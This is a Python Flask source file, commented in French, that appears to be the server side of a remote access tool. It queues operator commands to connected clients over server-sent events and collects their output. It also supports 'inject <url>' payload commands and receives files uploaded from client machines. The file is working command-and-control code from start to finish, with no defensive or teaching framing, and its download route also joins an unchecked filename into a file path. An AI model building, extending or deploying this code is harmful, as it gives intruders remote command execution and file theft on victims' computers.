from flask import Flask, Response, request, send_file, render_template
from queue import Queue, Empty
import threading
import time
import os
from colorama import Fore, Style, init

# Initialiser Colorama pour les couleurs
init(autoreset=True)

app = Flask(__name__)

# File d'attente pour les commandes à envoyer aux clients
command_queue = Queue()

# File d'attente pour les réponses des clients
response_queue = Queue()

# État global du serveur
server_state = {"shutdown_requested": False, "client_connected": False, "waiting_message_shown": False}

# Dossier pour les fichiers téléchargés
UPLOAD_FOLDER = "uploads"
os.makedirs(UPLOAD_FOLDER, exist_ok=True)


##################################  ROUTE POUR HTML ############################################

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/send-command', methods=['POST'])
def send_command():
    try:
        data = request.json
        command = data.get('command', '').strip()
        if not command:
            return {"message": "No command provided."}, 400

        command_queue.put(command)
        return {"message": f"Command '{command}' sent to client."}, 200
    except Exception as e:
        print(f"{Fore.RED}[ERROR]{Style.RESET_ALL} Error processing command: {str(e)}")
        return {"message": f"Error: {str(e)}"}, 500

# Endpoint SSE pour transmettre les réponses des clients au terminal HTML
@app.route('/responses')
def responses():
    def response_stream():
        while not server_state["shutdown_requested"]:
            try:
                # Récupérer une réponse de la file d'attente
                response = response_queue.get(timeout=1)

                # Diviser la réponse en morceaux si elle est trop longue
                chunk_size = 1024  # Taille des morceaux (en caractères)
                for i in range(0, len(response), chunk_size):
                    chunk = response[i:i + chunk_size]
                    yield f"data: {chunk}\n\n"
            except Empty:
                # Envoyer un keep-alive pour maintenir la connexion ouverte
                yield "data: keep-alive\n\n"
    return Response(response_stream(), content_type='text/event-stream')

###########################################################################################

# SSE endpoint pour les clients
@app.route('/rsse')
def sse():
    def event_stream():
        if not server_state["client_connected"]:
            server_state["client_connected"] = True
            server_state["waiting_message_shown"] = False
            print(f"\n{Fore.GREEN}[INFO]{Style.RESET_ALL} Client connected. Type commands in the terminal (SSE>)")

        while not server_state["shutdown_requested"]:
            try:
                command = command_queue.get(timeout=1)
                if command == "shutdown":
                    server_state["shutdown_requested"] = True
                    yield "data: shutdown\n\n"
                    break
                yield f"data: {command}\n\n"
            except Empty:
                # continue
                # Envoyer un keep-alive si aucune commande n'est disponible
                yield "data: keep-alive\n\n"
    return Response(event_stream(), content_type='text/event-stream')

# Endpoint POST pour recevoir les réponses des clients
@app.route('/post', methods=['POST'])
def post():
    try:
        data = request.data.decode('utf-8', errors='ignore')
        if data.startswith("databack:"):
            response = data[len("databack:"):].strip()
            response_queue.put(response)  # Ajouter la réponse à la file d'attente
            return "Response received", 200
        elif data == "shutdown":
            server_state["shutdown_requested"] = True
            return "Server is shutting down...", 200
        else:
            command_queue.put(data)
            try:
                response = response_queue.get(timeout=10)
                return f"Command processed. Databack received:\n{response}", 200
            except Empty:
                return "Command processed but no databack received (timeout).", 200
    except Exception as e:
        print(f"{Fore.RED}[ERROR]{Style.RESET_ALL} Error processing POST request: {str(e)}")
        return f"Error processing request: {str(e)}", 500
    
# Endpoint pour recevoir les fichiers téléchargés depuis le client
@app.route('/upload', methods=['POST'])
def upload():
    try:
        # Vérifier si la requête contient un fichier
        if 'file' not in request.files:
            print(f"{Fore.RED}[ERROR]{Style.RESET_ALL} No file part in the request.")
            return "No file part in the request.", 400

        file = request.files['file']
        if file.filename == '':
            print(f"{Fore.RED}[ERROR]{Style.RESET_ALL} No selected file.")
            return "No selected file.", 400

        # Créer le dossier Downloads s'il n'existe pas
        downloads_folder = os.path.join(os.getcwd(), "Downloads")
        os.makedirs(downloads_folder, exist_ok=True)

        # Enregistrer le fichier dans le dossier Downloads avec son nom de base
        filename = os.path.basename(file.filename)  # Extraire uniquement le nom du fichier
        file_path = os.path.join(downloads_folder, filename)
        file.save(file_path)

        print(f"{Fore.GREEN}[INFO]{Style.RESET_ALL} File '{filename}' uploaded from client successfully to '{file_path}'.")
        return "File uploaded successfully", 200
    except Exception as e:
        print(f"{Fore.RED}[ERROR]{Style.RESET_ALL} Error uploading file: {str(e)}")
        return f"Error uploading file: {str(e)}", 500
    
# Endpoint pour envoyer un fichier au client
@app.route('/download/<filename>', methods=['GET'])
def download(filename):
    file_path = os.path.join(UPLOAD_FOLDER, filename)
    if os.path.exists(file_path):
        print(f"{Fore.GREEN}[INFO]{Style.RESET_ALL} Sending file '{filename}' to client.")
        return send_file(file_path, as_attachment=True)
    else:
        print(f"{Fore.RED}[ERROR]{Style.RESET_ALL} File '{filename}' not found.")
        return f"File '{filename}' not found.", 404

# Thread pour gérer les commandes interactives
def command_input_thread():
    while not server_state["shutdown_requested"]:
        if server_state["client_connected"]:
            try:
                command = input(f"{Fore.CYAN}SSE>{Style.RESET_ALL} ")
                if not command.strip():
                    print(f"{Fore.RED}[ERROR]{Style.RESET_ALL} Empty command. Please enter a valid command.")
                    continue

                # Gestion des commandes inject, download et upload
                if command.startswith("inject "):
                    url = command.split(" ", 1)[1]
                    command_queue.put(f"inject {url}")
                    print(f"{Fore.GREEN}[INFO]{Style.RESET_ALL} Inject command sent to client for URL '{url}'.")
                elif command.startswith("download "):
                    filepath = command.split(" ", 1)[1]
                    filename = os.path.basename(filepath)  # Extraire uniquement le nom du fichier
                    command_queue.put(f"download {filename}")
                    print(f"{Fore.GREEN}[INFO]{Style.RESET_ALL} Download command sent to client for file '{filename}'.")
                elif command.startswith("upload "):
                    filename = command.split(" ", 1)[1]
                    command_queue.put(f"upload {filename}")
                    print(f"{Fore.GREEN}[INFO]{Style.RESET_ALL} Upload command sent to client for file '{filename}'.")
                else:
                    command_queue.put(command)
                    print(f"{Fore.GREEN}[INFO]{Style.RESET_ALL} Command '{command}' sent to client.")

                if command == "shutdown":
                    print(f"{Fore.RED}[INFO]{Style.RESET_ALL} Shutting down server...")
                    server_state["shutdown_requested"] = True
                    break
            except Exception as e:
                print(f"{Fore.RED}[ERROR]{Style.RESET_ALL} Error processing command input: {str(e)}")
        else:
            if not server_state["waiting_message_shown"]:
                print(f"{Fore.YELLOW}[INFO]{Style.RESET_ALL} Waiting for a client to connect...")
                server_state["waiting_message_shown"] = True
            time.sleep(1)

# Thread pour afficher les réponses des clients
def response_output_thread():
    while not server_state["shutdown_requested"]:
        try:
            response = response_queue.get(timeout=1)
            print(f"\n{Fore.YELLOW}[CLIENT RESPONSE]{Style.RESET_ALL} {response}")
            print(f"{Fore.CYAN}RSSE>{Style.RESET_ALL} ", end="", flush=True)
        except Empty:
            continue
        except Exception as e:
            print(f"{Fore.RED}[ERROR]{Style.RESET_ALL} Error processing client response: {str(e)}")

if __name__ == '__main__':
    try:
        threading.Thread(target=command_input_thread, daemon=True).start()
        threading.Thread(target=response_output_thread, daemon=True).start()

        print(f"{Fore.GREEN}[INFO]{Style.RESET_ALL} Starting SSE server on port 8085...")
        app.run(host='0.0.0.0', port=8085, threaded=True)
    except KeyboardInterrupt:
        print(f"\n{Fore.RED}[INFO]{Style.RESET_ALL} Server shutting down due to keyboard interrupt.")
    except Exception as e:
        print(f"{Fore.RED}[ERROR]{Style.RESET_ALL} Fatal error: {str(e)}")